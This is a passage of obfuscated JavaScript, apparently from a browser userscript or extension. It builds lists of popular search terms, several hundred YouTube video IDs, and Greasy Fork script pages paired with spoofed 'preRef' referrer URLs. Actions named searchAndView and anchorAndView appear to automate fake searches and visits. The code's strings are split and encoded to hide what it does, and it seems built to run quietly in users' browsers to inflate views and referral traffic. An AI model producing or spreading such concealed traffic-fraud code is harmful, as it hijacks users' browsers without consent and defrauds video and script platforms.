'\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x1 * 0x18a6 + -0x1 * 0x22a0 + 0x3b50)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x2 * -0xc83 + -0x15ff + -0x2fd * 0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + U(0x18) + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + U(0xa) + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x1 * 0x1fc9 + -0x1f24 + -0x1b * 0x6);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    V(0x10) + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    U(0x3) + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    U(0x2) + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': U(0x5) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + W(0x17, 'zjdQ') + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + V(0x15) + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x0) + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
